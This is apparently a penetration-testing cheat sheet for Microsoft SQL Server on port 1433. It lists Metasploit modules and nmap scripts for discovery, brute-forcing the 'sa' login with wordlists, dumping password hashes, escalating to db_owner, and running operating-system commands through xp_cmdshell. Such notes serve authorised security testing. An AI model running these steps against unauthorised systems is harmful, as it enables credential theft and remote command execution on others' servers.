### Port 1433 - MSSQL

- Version:

```
use auxiliary/scanner/mssql/mssql_ping

# Last options. Brute force.
scanner/mssql/mssql_login

# Log in to mssql
sqsh -S INSERTIPADDRESS -U sa

# Execute commands
xp_cmdshell 'date'
go
```


https://www.hackingarticles.in/mssql-peneration-testing-using-nmap/

https://www.hackingarticles.in/4-ways-to-hack-ms-sql-login-password/

## Exploitation

# MS-SQL

Locate
msf > use auxiliary/scanner/mssql/mssql_ping
nmap -sU -Pn -n -T4 --open -p1434 <targetRange>

nmap -p1433 --script ms-sql-info <targetIP>
nmap -p1433 --script ms-sql-brute --script-args mssql.instance-all,userdb=userlist.txt,passdb=wordlist.txt <targetIP>

msf > use auxiliary/scanner/mssql/mssql_login
msf > use auxiliary/admin/mssql/mssql_enum
msf > use auxiliary/scanner/mssql/mssql_hashdump
msf > use auxiliary/admin/mssql/mssql_escalate_dbowner

Post exploitation
msf > use auxiliary/admin/mssql/mssql_exec
